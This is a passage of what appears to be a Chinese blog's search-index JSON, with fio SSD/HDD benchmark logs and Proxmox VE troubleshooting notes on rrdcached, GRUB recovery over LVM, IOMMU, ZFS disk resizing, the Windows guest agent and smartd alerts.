4096B-4096B, ioengine=libaio, iodepth=4\nfio-3.28\nStarting 4 processes\nseq-read-4m: Laying out IO file (1 file / 10240MiB)\nJobs: 1 (f=0): [_(3),f(1)][100.0%][w=69.1MiB/s][w=17.7k IOPS][eta 00m:00s]\nseq-read-4m: (groupid=0, jobs=1): err= 0: pid=787066: Fri Sep 29 23:56:40 2023\n  read: IOPS=460, BW=1841MiB/s (1930MB/s)(10.0GiB/5563msec)\n    slat (usec): min=53, max=9744, avg=478.53, stdev=703.84\n    clat (msec): min=9, max=889, avg=68.36, stdev=87.28\n     lat (msec): min=10, max=889, avg=68.84, stdev=87.24\n    clat percentiles (msec):\n     |  1.00th=[   16],  5.00th=[   23], 10.00th=[   28], 20.00th=[   36],\n     | 30.00th=[   43], 40.00th=[   51], 50.00th=[   59], 60.00th=[   67],\n     | 70.00th=[   74], 80.00th=[   82], 90.00th=[   91], 95.00th=[  106],\n     | 99.00th=[  743], 99.50th=[  885], 99.90th=[  885], 99.95th=[  885],\n     | 99.99th=[  894]\n   bw (  MiB/s): min=  945, max= 2324, per=100.00%, avg=1988.74, stdev=387.84, samples=10\n   iops        : min=  236, max=  581, avg=496.70, stdev=96.92, samples=10\n  lat (msec)   : 10=0.04%, 20=2.54%, 50=36.60%, 100=54.69%, 250=4.92%\n  lat (msec)   : 750=0.39%, 1000=0.82%\n  cpu          : usr=0.58%, sys=21.22%, ctx=2383, majf=0, minf=32780\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nseq-write-4m: (groupid=1, jobs=1): err= 0: pid=787186: Fri Sep 29 23:56:40 2023\n  write: IOPS=235, BW=940MiB/s (986MB/s)(10.0GiB/10890msec); 0 zone resets\n    slat (usec): min=69, max=73786, avg=783.64, stdev=3051.53\n    clat (msec): min=2, max=2041, avg=135.28, stdev=287.50\n     lat (msec): min=2, max=2042, avg=136.06, stdev=287.42\n    clat percentiles (msec):\n     |  1.00th=[   14],  5.00th=[   21], 10.00th=[   27], 20.00th=[   36],\n     | 30.00th=[   46], 40.00th=[   57], 50.00th=[   68], 60.00th=[   83],\n     | 70.00th=[  102], 80.00th=[  126], 90.00th=[  182], 95.00th=[  326],\n     | 99.00th=[ 2022], 99.50th=[ 2022], 99.90th=[ 2039], 99.95th=[ 2039],\n     | 99.99th=[ 2039]\n   bw (  MiB/s): min=  370, max= 2341, per=100.00%, avg=1198.88, stdev=516.41, samples=16\n   iops        : min=   92, max=  585, avg=299.31, stdev=129.04, samples=16\n  lat (msec)   : 4=0.20%, 10=0.55%, 20=4.14%, 50=29.77%, 100=34.84%\n  lat (msec)   : 250=24.14%, 500=2.30%, 750=1.05%, 2000=1.76%, &gt;=2000=1.25%\n  cpu          : usr=7.14%, sys=12.19%, ctx=1959, majf=0, minf=14\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,2560,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nrand-read-4k: (groupid=2, jobs=1): err= 0: pid=787189: Fri Sep 29 23:56:40 2023\n  read: IOPS=42.8k, BW=167MiB/s (175MB/s)(9.79GiB/60001msec)\n    slat (nsec): min=1180, max=378282k, avg=4607.87, stdev=236197.07\n    clat (nsec): min=240, max=1725.2M, avg=87451.41, stdev=4192102.00\n     lat (usec): min=12, max=1725.2k, avg=92.80, stdev=4327.60\n    clat percentiles (usec):\n     |  1.00th=[   18],  5.00th=[   21], 10.00th=[   22], 20.00th=[   26],\n     | 30.00th=[   30], 40.00th=[   47], 50.00th=[   92], 60.00th=[   96],\n     | 70.00th=[   99], 80.00th=[  104], 90.00th=[  115], 95.00th=[  129],\n     | 99.00th=[  212], 99.50th=[  306], 99.90th=[  578], 99.95th=[  742],\n     | 99.99th=[ 1893]\n   bw (  KiB/s): min=13755, max=264232, per=100.00%, avg=183324.63, stdev=52285.27, samples=111\n   iops        : min= 3438, max=66058, avg=45831.09, stdev=13071.34, samples=111\n  lat (nsec)   : 250=0.01%, 500=0.01%, 750=0.01%, 1000=0.01%\n  lat (usec)   : 2=0.01%, 4=0.01%, 10=0.01%, 20=4.54%, 50=35.97%\n  lat (usec)   : 100=31.58%, 250=27.11%, 500=0.66%, 750=0.10%, 1000=0.03%\n  lat (msec)   : 2=0.01%, 4=0.01%, 10=0.01%, 20=0.01%, 50=0.01%\n  lat (msec)   : 500=0.01%, 750=0.01%, 1000=0.01%, 2000=0.01%\n  cpu          : usr=7.24%, sys=27.70%, ctx=1476701, majf=0, minf=20\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2567447,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\nrand-write-4k: (groupid=3, jobs=1): err= 0: pid=788193: Fri Sep 29 23:56:40 2023\n  write: IOPS=30.2k, BW=118MiB/s (124MB/s)(7081MiB/60001msec); 0 zone resets\n    slat (nsec): min=1260, max=40475k, avg=6308.96, stdev=55626.04\n    clat (nsec): min=300, max=1630.1M, avg=125086.99, stdev=2894812.01\n     lat (usec): min=17, max=1630.1k, avg=131.50, stdev=2895.61\n    clat percentiles (usec):\n     |  1.00th=[   21],  5.00th=[   25], 10.00th=[   29], 20.00th=[   49],\n     | 30.00th=[   94], 40.00th=[   98], 50.00th=[  101], 60.00th=[  105],\n     | 70.00th=[  111], 80.00th=[  119], 90.00th=[  149], 95.00th=[  221],\n     | 99.00th=[  498], 99.50th=[  758], 99.90th=[ 3163], 99.95th=[ 6063],\n     | 99.99th=[23725]\n   bw (  KiB/s): min=10431, max=171952, per=100.00%, avg=122835.52, stdev=47622.27, samples=112\n   iops        : min= 2607, max=42988, avg=30708.83, stdev=11905.58, samples=112\n  lat (nsec)   : 500=0.01%, 750=0.01%, 1000=0.01%\n  lat (usec)   : 2=0.01%, 4=0.01%, 10=0.01%, 20=0.73%, 50=19.45%\n  lat (usec)   : 100=25.98%, 250=49.77%, 500=3.06%, 750=0.49%, 1000=0.19%\n  lat (msec)   : 2=0.17%, 4=0.07%, 10=0.05%, 20=0.02%, 50=0.01%\n  lat (msec)   : 100=0.01%, 250=0.01%, 750=0.01%, 2000=0.01%\n  cpu          : usr=4.53%, sys=20.36%, ctx=1376235, majf=0, minf=16\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,1812637,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\n\nRun status group 0 (all jobs):\n   READ: bw=1841MiB/s (1930MB/s), 1841MiB/s-1841MiB/s (1930MB/s-1930MB/s), io=10.0GiB (10.7GB), run=5563-5563msec\n\nRun status group 1 (all jobs):\n  WRITE: bw=940MiB/s (986MB/s), 940MiB/s-940MiB/s (986MB/s-986MB/s), io=10.0GiB (10.7GB), run=10890-10890msec\n\nRun status group 2 (all jobs):\n   READ: bw=167MiB/s (175MB/s), 167MiB/s-167MiB/s (175MB/s-175MB/s), io=9.79GiB (10.5GB), run=60001-60001msec\n\nRun status group 3 (all jobs):\n  WRITE: bw=118MiB/s (124MB/s), 118MiB/s-118MiB/s (124MB/s-124MB/s), io=7081MiB (7425MB), run=60001-60001msec\n\nDisk stats (read/write):\n  sda: ios=2588374/1830074, merge=92/389, ticks=1241127/2284278, in_queue=3529480, util=95.33%\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#n5105-\u94e0\u4fa0-rc20-500gb","title":"n5105 \u94e0\u4fa0 rc20 500GB","text":"<pre><code>root@n5105-pve \u279c  fio fio --filename=test.bin ssd-win-likely.fio\nseq-read-4m: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nseq-write-4m: (g=1): rw=write, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nrand-read-4k: (g=2): rw=randread, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nrand-write-4k: (g=3): rw=randwrite, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nfio-3.33\nStarting 4 processes\nJobs: 1 (f=1): [_(3),w(1)][59.0%][w=3081KiB/s][w=770 IOPS][eta 02m:19s]\nseq-read-4m: (groupid=0, jobs=1): err= 0: pid=422690: Sat Sep 30 00:46:36 2023\n  read: IOPS=140, BW=560MiB/s (588MB/s)(10.0GiB/18274msec)\n    slat (usec): min=5966, max=22258, avg=7123.69, stdev=945.70\n    clat (usec): min=13, max=331888, avg=219709.66, stdev=21151.42\n     lat (msec): min=6, max=338, avg=226.83, stdev=21.36\n    clat percentiles (msec):\n     |  1.00th=[  180],  5.00th=[  209], 10.00th=[  211], 20.00th=[  213],\n     | 30.00th=[  218], 40.00th=[  218], 50.00th=[  220], 60.00th=[  222],\n     | 70.00th=[  222], 80.00th=[  222], 90.00th=[  226], 95.00th=[  232],\n     | 99.00th=[  296], 99.50th=[  330], 99.90th=[  330], 99.95th=[  330],\n     | 99.99th=[  334]\n   bw (  KiB/s): min=357840, max=614400, per=99.09%, avg=568612.03, stdev=44133.11, samples=36\n   iops        : min=   87, max=  150, avg=138.75, stdev=10.82, samples=36\n  lat (usec)   : 20=0.04%\n  lat (msec)   : 10=0.04%, 20=0.04%, 50=0.20%, 100=0.23%, 250=95.62%\n  lat (msec)   : 500=3.83%\n  cpu          : usr=0.33%, sys=26.03%, ctx=10676, majf=0, minf=32779\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nseq-write-4m: (groupid=1, jobs=1): err= 0: pid=447378: Sat Sep 30 00:46:36 2023\n  write: IOPS=29, BW=118MiB/s (123MB/s)(7168MiB/60944msec); 0 zone resets\n    slat (usec): min=1337, max=3922.2k, avg=33986.69, stdev=277349.50\n    clat (usec): min=13, max=4661.5k, avg=1053752.98, stdev=1375122.08\n     lat (msec): min=54, max=4680, avg=1087.74, stdev=1395.81\n    clat percentiles (msec):\n     |  1.00th=[   63],  5.00th=[   88], 10.00th=[  105], 20.00th=[  109],\n     | 30.00th=[  144], 40.00th=[  205], 50.00th=[  262], 60.00th=[  531],\n     | 70.00th=[ 1028], 80.00th=[ 2970], 90.00th=[ 3574], 95.00th=[ 3809],\n     | 99.00th=[ 4530], 99.50th=[ 4597], 99.90th=[ 4665], 99.95th=[ 4665],\n     | 99.99th=[ 4665]\n   bw (  KiB/s): min= 8208, max=787386, per=100.00%, avg=306489.37, stdev=235225.24, samples=46\n   iops        : min=    2, max=  192, avg=74.54, stdev=57.29, samples=46\n  lat (usec)   : 20=0.06%\n  lat (msec)   : 100=8.37%, 250=37.67%, 500=13.06%, 750=3.18%, 1000=6.19%\n  lat (msec)   : 2000=10.71%, &gt;=2000=20.76%\n  cpu          : usr=0.86%, sys=5.95%, ctx=26464, majf=0, minf=12\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.4%, 16=0.9%, 32=98.3%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=99.9%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,1792,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nrand-read-4k: (groupid=2, jobs=1): err= 0: pid=449479: Sat Sep 30 00:46:36 2023\n  read: IOPS=2352, BW=9409KiB/s (9634kB/s)(551MiB/60001msec)\n    slat (usec): min=6, max=24639, avg=421.40, stdev=272.49\n    clat (usec): min=2, max=36072, avg=1277.22, stdev=607.71\n     lat (usec): min=374, max=42067, avg=1698.61, stdev=744.53\n    clat percentiles (usec):\n     |  1.00th=[  996],  5.00th=[ 1037], 10.00th=[ 1074], 20.00th=[ 1106],\n     | 30.00th=[ 1139], 40.00th=[ 1156], 50.00th=[ 1188], 60.00th=[ 1237],\n     | 70.00th=[ 1287], 80.00th=[ 1352], 90.00th=[ 1483], 95.00th=[ 1614],\n     | 99.00th=[ 2507], 99.50th=[ 3032], 99.90th=[12518], 99.95th=[15401],\n     | 99.99th=[17695]\n   bw (  KiB/s): min= 1744, max=10080, per=99.99%, avg=9408.22, stdev=1395.59, samples=119\n   iops        : min=  436, max= 2520, avg=2351.96, stdev=348.88, samples=119\n  lat (usec)   : 4=0.01%, 500=0.01%, 750=0.03%, 1000=1.37%\n  lat (msec)   : 2=96.73%, 4=1.58%, 10=0.15%, 20=0.14%, 50=0.01%\n  cpu          : usr=0.87%, sys=9.69%, ctx=141627, majf=0, minf=13\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=141132,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\nrand-write-4k: (groupid=3, jobs=1): err= 0: pid=505899: Sat Sep 30 00:46:36 2023\n  write: IOPS=776, BW=3105KiB/s (3179kB/s)(182MiB/60001msec); 0 zone resets\n    slat (usec): min=8, max=64884, avg=1276.50, stdev=1138.90\n    clat (usec): min=4, max=125427, avg=3870.75, stdev=2918.05\n     lat (usec): min=760, max=168093, avg=5147.25, stdev=3727.98\n    clat percentiles (usec):\n     |  1.00th=[  1680],  5.00th=[  2147], 10.00th=[  2245], 20.00th=[  2376],\n     | 30.00th=[  2507], 40.00th=[  2704], 50.00th=[  3032], 60.00th=[  3982],\n     | 70.00th=[  4817], 80.00th=[  5407], 90.00th=[  5997], 95.00th=[  6521],\n     | 99.00th=[  8848], 99.50th=[ 11338], 99.90th=[ 31065], 99.95th=[ 66323],\n     | 99.99th=[110625]\n   bw (  KiB/s): min= 1405, max= 5016, per=99.72%, avg=3096.45, stdev=976.25, samples=119\n   iops        : min=  351, max= 1254, avg=774.01, stdev=244.12, samples=119\n  lat (usec)   : 10=0.01%, 750=0.01%, 1000=0.01%\n  lat (msec)   : 2=1.54%, 4=58.60%, 10=39.19%, 20=0.46%, 50=0.12%\n  lat (msec)   : 100=0.03%, 250=0.03%\n  cpu          : usr=0.77%, sys=8.83%, ctx=99364, majf=0, minf=10\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,46570,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\n\nRun status group 0 (all jobs):\n   READ: bw=560MiB/s (588MB/s), 560MiB/s-560MiB/s (588MB/s-588MB/s), io=10.0GiB (10.7GB), run=18274-18274msec\n\nRun status group 1 (all jobs):\n  WRITE: bw=118MiB/s (123MB/s), 118MiB/s-118MiB/s (123MB/s-123MB/s), io=7168MiB (7516MB), run=60944-60944msec\n\nRun status group 2 (all jobs):\n   READ: bw=9409KiB/s (9634kB/s), 9409KiB/s-9409KiB/s (9634kB/s-9634kB/s), io=551MiB (578MB), run=60001-60001msec\n\nRun status group 3 (all jobs):\n  WRITE: bw=3105KiB/s (3179kB/s), 3105KiB/s-3105KiB/s (3179kB/s-3179kB/s), io=182MiB (191MB), run=60001-60001msec\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#pci-subvendor-id","title":"pci subvendor id","text":"<pre><code>cat /sys/bus/pci/devices/*/uevent\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#summary-\u65f6\u95f4\u4e3a-1970","title":"summary \u65f6\u95f4\u4e3a 1970","text":"<p>How to Fix Proxmox VE (PVE) keep asking/request login / PVE endless login/web gui login window (&amp; PVE RRD error, statistics error/not updating etc.) &lt; Blog-D without Nonsense (dannyda.com)</p> <pre><code>systemctl stop rrdcached.service\nrm -rf /var/lib/rrdcached\nsystemctl start rrdcached.service\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u5f15\u5bfc\u4fee\u590d","title":"\u5f15\u5bfc\u4fee\u590d","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#lvm_1","title":"lvm","text":"<p>Recover From Grub Failure - Proxmox VE linux - How to mount an LVM volume? - Super User</p> <p>prepare</p> <pre><code>yum install lvm2    # debian11 alreay installed\nmodprobe dm-mod     # needed, test on debian1 Live CD\n</code></pre> <p>activate LVM</p> <pre><code>\u00a0vgscan\n\u00a0vgchange -ay\n</code></pre> <p>mount the the root partition that is inside the LVM container</p> <pre><code>sudo mkdir /media/RESCUE\nsudo mount /dev/pve/root /media/RESCUE/\nsudo mount /dev/sdb2 /media/RESCUE/boot/efi  # mount EFI\nsudo mount -t proc proc /media/RESCUE/proc\nsudo mount -t sysfs sys /media/RESCUE/sys\nsudo mount -o bind /dev /media/RESCUE/dev\nsudo mount -o bind /run /media/RESCUE/run  # for LVM and raid\n</code></pre> <p>install grub</p> <pre><code>update-grub\ngrub-install /dev/sda\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#zfs_1","title":"zfs","text":"<p>todo</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u6362\u4e3b\u677f\u540e\u7684\u4e00\u5927\u5806\u95ee\u9898","title":"\u6362\u4e3b\u677f\u540e\u7684\u4e00\u5927\u5806\u95ee\u9898","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u8bc6\u522b\u4e0d\u5230\u542f\u52a8\u9879","title":"\u8bc6\u522b\u4e0d\u5230\u542f\u52a8\u9879","text":"<p>\u4e3b\u677f\u4e2d\u4e5f\u5b58\u50a8\u4e86\u542f\u52a8\u9879\uff0c\u548cEFI\u5206\u533a\u4e2d\u7684efi\u6587\u4ef6\u5e76\u4e0d\u4e00\u6837\u3002\u4e3b\u677f\u901a\u5e38\u4f1a\u81ea\u5df1\u626b\u63cf\u8bc6\u522b\uff0c\u4f46\u662f\u4e5f\u6709\u4e22\u5931\u7684\u60c5\u51b5\u3002</p> <p>\u5927\u6982\u5c31\u662f\u8fdb\u5165usb live ubuntu\uff0c\u91cd\u65b0install grub\u3002efimanager</p> <p>TODO</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u663e\u5361\u76f4\u901a\u8fdb\u4e0d\u4e86\u7cfb\u7edf","title":"\u663e\u5361\u76f4\u901a\u8fdb\u4e0d\u4e86\u7cfb\u7edf","text":"<p>\u542f\u52a8\u540e\uff0c\u7531\u4e8e\u663e\u5361\u76f4\u901a\u4e86\u3002\u800c\u7531\u4e8epci\u69fd\u53d8\u4e86\uff0c\u6240\u4ee5vm\u4e5f\u65e0\u6cd5\u542f\u52a8\u6210\u529f\u3002\u7f51\u5361\u53c8\u53d8\u4e86\uff0c\u56e0\u6b64\u4e5f\u65e0\u6cd5\u901a\u8fc7\u7f51\u7edc\u8fde\u63a5pve\u3002</p> <p>\u5373\u4f7f\u8fdb\u5165usb live cd\u7cfb\u7edf\uff0c\u7531\u4e8e\u4f7f\u7528\u7684zfs\uff0c\u64cd\u4f5c\u8d77\u6765\u5f88\u4e0d\u65b9\u4fbf\u3002</p> <p>\u6709\u4e00\u4e2a\u529e\u6cd5\uff0c\u5c31\u662f\u5185\u6838\u53c2\u6570\u4e2d\u4e34\u65f6\u5173\u95ediommu\uff0c\u8fd9\u6837\u4f1a\u7981\u7528\u6240\u6709\u663e\u5361\u76f4\u901a\u7684\u673a\u5668\u542f\u52a8\u3002\u4ece\u800c\u53ef\u4ee5\u8fdb\u5165pve\u7684\u547d\u4ee4\u884c\u8fdb\u884c\u64cd\u4f5c\u3002</p> <pre><code>amd_iommu=off \u6216intel_iommu=off\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#windows-\u78c1\u76d8\u6269\u5145","title":"windows \u78c1\u76d8\u6269\u5145","text":"<ol> <li>pve \u4e2d zfs set volsize</li> <li>qm set --scsix\uff1a\u7528\u4e8e\u66f4\u65b0\u914d\u7f6e\u6587\u4ef6\u4e2d\u78c1\u76d8\u7684 size \u53c2\u6570\uff08\u4e5f\u8bb8\u8fd9\u6b65\u662f\u53ef\u9009\u7684\uff09</li> <li>\u5173\u673a\u865a\u62df\u673a\uff1a\u5fc5\u987b\u7684\uff0c\u91cd\u542f\u865a\u62df\u673a\u5927\u5c0f\u4e0d\u4f1a\u6539\u53d8</li> <li>\u542f\u52a8\u865a\u62df\u673a\uff0c\u865a\u62df\u673a\u5185\u8c03\u6574\u78c1\u76d8\u5927\u5c0f</li> </ol> <p>e.g <pre><code>zfs set volsize=1200G pool0/data/vm-200-disk-gamessd\n\nqm set 201 --scsi4 pool0:vm-200-disk-gamessd,discard=on,iothread=1,ssd=1\n</code></pre></p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#windows-guest-agent-not-running","title":"windows guest agent not running","text":"<p>\u4e4b\u524d\u5c1d\u8bd5 virtfs \u65f6\uff0c\u4e0b\u8f7d\u4e86 virtio-win-0.1.262 iso \u6587\u4ef6\uff0c\u60f3\u7ed9 windows \u66f4\u65b0\u65b0\u7684 virtio \u9a71\u52a8\u3002\u4f46\u662f\u53d1\u73b0\u5b89\u88c5\u5931\u8d25\u4e86\uff08\u611f\u89c9\u662f\u7531\u4e8e windows \u7cfb\u7edf\u5c31\u5b89\u88c5\u5728 virtio \u76d8\u4e0a\uff0c\u66f4\u65b0\u9a71\u52a8\u4f1a\u5bfc\u81f4\u51b2\u7a81\uff09\u3002</p> <p>\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u4f1a\u5378\u8f7d\u539f\u6709\u9a71\u52a8\uff0c\u751a\u81f3\u5bfc\u81f4\u7531\u4e8e\u4e22\u5931\u9a71\u52a8\uff0c\u7f51\u7edc\u4e0d\u901a\u7684\u60c5\u51b5\uff0c\u6700\u540e\u901a\u8fc7 zfs \u5907\u4efd\u6062\u590d\u7cfb\u7edf\u76d8\u6062\u590d\u4e86\u3002</p> <p>\u8fd9\u6b21\u7ed9 gamessd \u865a\u62df\u76d8\u6269\u5bb9\u65f6\uff0c\u53c8\u5c1d\u8bd5\u66f4\u65b0\u9a71\u52a8\uff0c\u4ecd\u7136\u66f4\u65b0\u4e0d\u4e86\u3002\u5e76\u4e14\u53d1\u73b0 PVE WebUI \u4e2d\u865a\u62df\u673a\u663e\u793a\u7684\u662f guest agent not running\uff0c \u770b\u4e0d\u5230\u865a\u62df\u673a ip \u4e86\u3002</p> <p>\u95ee\u9898\u5728\u4e8e\u9a71\u52a8\u4e22\u5931\u4e86\uff0c\u53c2\u8003 wiki \u4fee\u590d\u9a71\u52a8\uff1aQemu-guest-agent - Proxmox VE</p> <p>Then install the virtio-serial driver: 1. Attach the ISO to your windows VM (virtio-*.iso) 2. Go to the windows Device Manager 3. Look for \"PCI Simple Communications Controller\" 4. Right Click -&gt; Update Driver and select on the mounted iso in <code>DRIVE:\\vioserial\\&lt;OSVERSION&gt;\\ where &lt;OSVERSION&gt; is your Windows Version (e.g. 2k12R2 for Windows 2012 R2)</code></p> <p>\u6d4b\u8bd5\uff0c\u6ca1\u6709\u8f93\u51fa\u8868\u793a\u6210\u529f\uff08\u8fd9\u6761\u547d\u4ee4\u5728 qm --help \u4e2d\u90fd\u6ca1\u6709\u663e\u793a\uff0czsh \u4e5f\u4e0d\u4f1a\u8865\u5168\uff09 <pre><code>qm agent &lt;vmid&gt; ping\n</code></pre></p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#smartd-\u53d1\u90ae\u4ef6","title":"Smartd \u53d1\u90ae\u4ef6","text":"<p>\u78c1\u76d8\u51fa\u73b0\u4e86\u574f\u6247\u533a\uff0cPVE \u6bcf 24 h \u53d1\u9001\u4e00\u5c01\u90ae\u4ef6\uff0c\u5f88\u70e6\uff0c\u5e76\u4e14\u53ef\u80fd\u8ba9\u6211\u9519\u8fc7\u771f\u6b63\u91cd\u8981\u7684\u4fe1\u606f\u3002\u56e0\u6b64\u60f3\u5b9e\u73b0\uff0c\u53ea\u6709\u5728\u78c1\u76d8\u9519\u8bef\u589e\u52a0\u65f6\u624d\u901a\u77e5\u6211\u3002</p> <p>smartd.conf(5) \u2014 smartmontools \u2014 Debian unstable \u2014 Debian Manpages \u5f53\u524d\u65e0\u6cd5\u8bfb\u53d6\uff08\u5f85\u5904\u7406\uff09\u7684\u6247\u533a - SMART-Daemon Proxmox \u2013 Thomas-Krenn-Wiki --- Currently unreadable (pending) sectors - SMART-Daemon Proxmox \u2013 Thomas-Krenn-Wiki</p> <p>\u5148\u7b80\u5355\u5b9e\u73b0\u4e3a\u7981\u6b62\u90a3\u5757\u574f\u76d8\u901a\u77e5\u6211</p> <ul> <li>\u653e\u5728 <code>DEVICESCAN</code> \u4e4b\u524d <pre><code>/dev/disk/by-id/ata-ST3000DM001-1CH166_Z1F5V8VG -I 197 -I 198\nDEVICESCAN -d removable -n standby -m root -M exec /usr/share/smartmontools/smartd-runner\n</code></pre></li> </ul> <p><code>-I ID</code></p> <ul> <li>[ATA only] Ignore device Attribute\u00a0ID\u00a0when tracking changes in the Attribute values.\u00a0ID\u00a0must be a decimal integer in the range from 1 to 255. This Directive modifies the behavior of the '-p', '-u', and '-t' tracking Directives and has no effect without one of them.</li> <li>This is useful, for example, if one of the device Attributes is the disk temperature (usually Attribute 194 or 231). It's annoying to get reports each time the temperature changes. This Directive may appear multiple times for a single device, if you want to ignore multiple Attributes.</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2024/01/08/docker/","title":"docker","text":"<p>\u8bb0\u5f55 docker \u7684\u4f7f\u7528\uff0c\u5305\u542b docker \u5e38\u7528\u547d\u4ee4\u548c Dockerfile \u7684\u7f16\u5199\u3002\u76ee\u524d\u5df2\u7ecf\u6210\u529f\u4f7f\u7528 dockerfile 